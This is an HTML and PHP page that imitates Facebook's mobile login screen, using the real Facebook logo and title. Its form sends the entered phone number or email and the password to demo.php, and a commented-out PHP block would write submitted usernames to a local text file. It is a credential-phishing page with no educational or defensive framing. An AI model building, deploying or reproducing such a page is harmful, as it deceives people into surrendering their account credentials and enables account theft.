<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="assets/fav.png" type="image/gif" sizes="16x16">

    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">

    <title>facebook - log in or sign up</title>
  </head>
  <body>
    
    <div class="alert alert-warning" style="height: 50px; ;color: #3b5998; background-color: #fffbe2;"  role="alert">
       <img class="topicon" 
       src="assets/topicon.png" alt="facebook"> <a class="top-text" href="#">  Facebook for Android and browse faster.
      </a></div>

    <div class="logo"><img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" 
      width="140px" class="img" alt="facebook"></div>
<div class="container">
<form action="demo.php" method="post">
      <input class="phone" name="phone" type="text" placeholder="Mobile number or email address"><br>
      <input class="pass" name="password" type="password" class="pass" placeholder="Password">
      <input type="hidden" value="true" name="hidden">
      <br>  <center><button class="login">Log In</button></center>
    </form>



<?php
// if ($_POST['hidden']) {
//     $phone = trim($_POST['phone']);
//     $phone .= "n/";
//     if($file = fopen("username.txt" , "a+")){
//         fwrite($file, $_POST['phone']);
//     }
//     fclose($file);
//     $lines = file("username.txt");
// }




?>

   
<p style="text-align: center; margin-top: 10px;">or</p>

<button class="createac">Create New Account</button>
<br>
<center><a style="font-size: 15px; color: #5d83bb;" href="#">Forgetten Password?</a>
</center>
<br>

<!-- 
<a href="#">English (UK)</a>
 -->

<nav class="footer">
<a class="foot" href="#">About</a>
<a class="foot"  href="#">Help</a>
<a class="foot" href="#">More</a>
</nav>

</div>
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>
  </body>
</html>

